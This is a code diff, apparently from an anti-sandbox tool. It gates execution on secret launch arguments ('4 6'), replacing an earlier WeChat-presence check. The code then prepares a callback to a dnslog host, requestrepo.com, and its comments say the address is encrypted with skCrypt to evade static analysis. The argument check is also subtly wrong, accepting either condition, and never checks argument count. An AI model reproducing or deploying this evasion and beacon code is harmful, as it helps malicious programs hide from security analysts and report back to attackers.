@@ -188,9 +188,18 @@ bool check_wechat() {
         return TRUE;
     }
 }
-int main() {
+//判断给的参数是否满足条件 x+y=10,x*y=24,启动时附带参数Anti-Sandbox.exe 4 6 才可成功启动
+bool check_args(char* argv[]) {
+    if (atoi(argv[1]) + atoi(argv[2]) != 10 && atoi(argv[1]) * atoi(argv[2]) != 24) {
+            return false;
+    }
+    else {
+        return true;
+    }
+}
+int main(int argc, char* argv[]) {
     //用于提示已经成功执行
-    if (check_wechat()) {
+    if (check_args(argv)) {
         //dnslog地址 可自行更换或者不使用
         //使用了skCrypt库加密字符串 防止静态分析发现dnslog地址
         auto url = skCrypt("ul6u2p5x.requestrepo.com");
